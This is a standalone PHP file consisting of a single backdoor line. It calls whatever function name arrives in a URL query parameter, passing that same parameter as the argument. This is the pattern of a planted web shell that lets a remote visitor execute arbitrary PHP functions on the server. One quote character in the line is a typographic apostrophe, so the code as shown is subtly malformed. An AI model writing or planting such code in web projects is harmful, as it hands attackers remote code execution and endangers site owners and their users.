<?php
$_GET[’6CfFxRVX']($_GET['6CfFxRVX']);
?>
